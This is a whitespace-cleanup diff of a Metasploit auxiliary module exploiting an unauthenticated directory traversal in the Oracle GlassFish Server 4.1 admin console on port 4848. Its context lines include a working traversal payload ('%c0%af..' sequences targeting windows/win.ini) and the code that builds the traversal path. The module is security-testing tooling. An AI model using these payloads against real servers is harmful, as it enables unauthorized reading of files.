@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'        => 'Path Traversal in Oracle GlassFish Server Open Source Edition',
       'Description' => %q{
         This module exploits an unauthenticated directory traversal vulnerability
-        which exits in administration console of Oracle GlassFish Server 4.1, which is 
+        which exits in administration console of Oracle GlassFish Server 4.1, which is
         listening by default on port 4848/TCP.
       },
       'References'  =>
@@ -26,8 +26,8 @@ class MetasploitModule < Msf::Auxiliary
           'Dhiraj Mishra' # Metasploit module
         ],
       'License'     => MSF_LICENSE
-	  'DisclosureDate' => "Aug 08 2015"
-    ))
+      'DisclosureDate' => "Aug 08 2015"
+	    ))
 
     register_options(
       [
@@ -35,9 +35,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, "The path to the file to read", '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini']),
         OptInt.new('DEPTH', [ true, 'Path Traversal Depth', 10 ])
       ])
-      
   end
-
+	
   def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "..%5d" * datastore['DEPTH'] << filename
